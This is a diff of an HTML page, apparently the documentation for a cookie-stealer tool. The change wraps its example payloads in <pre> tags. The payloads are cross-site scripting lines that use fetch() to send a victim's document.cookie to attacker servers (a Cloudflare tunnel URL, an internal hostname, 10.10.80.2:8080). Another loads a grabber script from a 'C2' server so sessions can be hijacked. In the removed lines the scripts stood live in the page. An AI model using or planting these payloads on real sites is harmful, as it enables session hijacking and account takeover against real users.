@@ -44,18 +44,16 @@ In order to transmit the cookie to the attacker's server, you need to create a p
   <li>Cookie stealer saves the cookie and adds a timestamp. The session can be hijacked, as lang as it is established</li>
 </ol>
 
-<h3>Over web with Flask + https:</h3>
-<script>fetch('https://[IDENTIFIER]trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script>
+<h3>Over web with Flask + Cloudflare Tunnel + https:</h3>
+<pre><script>fetch('https://[IDENTIFIER]trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script></pre>
 
 <h3>Within the Network with Flask:</h3>
-<script>fetch('http://hostname/grab?c='+encodeURIComponent(document.cookie))</script>
-<br>
-<br>
+<pre><script>fetch('http://hostname/grab?c='+encodeURIComponent(document.cookie))</script></pre>
 Example: <br>
-<script>fetch('http://10.10.80.2:8080/grab?c='+encodeURIComponent(document.cookie))</script>
+<pre><script>fetch('http://10.10.80.2:8080/grab?c='+encodeURIComponent(document.cookie))</script></pre>
 
 <h3>Within the network with apache "C2"-Server:</h3>
-<script src="http://[IP]/cookiegrabber/grabber.js"></script>
+<pre><script src="http://[IP]/cookiegrabber/grabber.js"></script></pre>
 
 
 
